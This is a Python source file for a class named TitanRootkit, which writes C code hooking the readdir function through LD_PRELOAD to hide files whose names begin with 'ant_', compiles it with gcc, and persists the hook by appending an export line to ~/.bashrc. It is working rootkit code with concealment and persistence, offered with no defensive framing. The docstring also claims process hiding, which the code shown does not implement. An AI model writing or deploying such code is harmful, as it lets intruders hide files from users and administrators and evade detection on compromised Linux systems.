import os
import subprocess
import time
from rich.console import Console

console = Console()

class TitanRootkit:
    """
    Userland Rootkit (LD_PRELOAD).
    Hides files and processes on Ubuntu.
    """
    def __init__(self, hide_prefix="ant_"):
        self.hide_prefix = hide_prefix
        self.so_path = os.path.abspath("libtitan.so")

    def deploy(self):
        console.print("[TITAN] 🦾 Engaging Cloaking Protocol...")
        if self._compile_hook():
            self._inject_env()
            return True
        return False

    def _compile_hook(self):
        c_code = f"""
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <dlfcn.h>

// Original readdir function pointer
static struct dirent *(*original_readdir)(DIR *);

struct dirent *readdir(DIR *dirp) {{
    if (!original_readdir) {{
        original_readdir = dlsym(RTLD_NEXT, "readdir");
    }}

    struct dirent *entry;
    do {{
        entry = original_readdir(dirp);
        if (entry && strncmp(entry->d_name, "{self.hide_prefix}", {len(self.hide_prefix)}) == 0) {{
            // Found target file, skip it (hide)
            continue;
        }}
    }} while (entry && strncmp(entry->d_name, "{self.hide_prefix}", {len(self.hide_prefix)}) == 0);

    return entry;
}}
"""
        try:
            with open("titan_hook.c", "w") as f:
                f.write(c_code)

            # Compile shared object
            # Requires gcc
            cmd = "gcc -fPIC -shared -o libtitan.so titan_hook.c -ldl"
            subprocess.check_call(cmd, shell=True)
            console.print("[TITAN] ✅ Hook Compiled: libtitan.so")
            return True
        except Exception as e:
            console.print(f"[TITAN] ❌ Compilation Failed: {e}")
            return False

    def _inject_env(self):
        """
        Injects into current session and .bashrc
        """
        # Current session (for immediate effect in python subprocesses mostly)
        os.environ["LD_PRELOAD"] = self.so_path
        console.print(f"[TITAN] 💉 Injected LD_PRELOAD={self.so_path}")

        # Persistence via bashrc
        try:
            bashrc = os.path.expanduser("~/.bashrc")
            line = f"export LD_PRELOAD={self.so_path}"
            with open(bashrc, "r") as f:
                content = f.read()
            if line not in content:
                with open(bashrc, "a") as f:
                    f.write(f"\n# Titan Loader\n{line}\n")
                console.print("[TITAN] 💾 Persisted to ~/.bashrc")
        except: pass
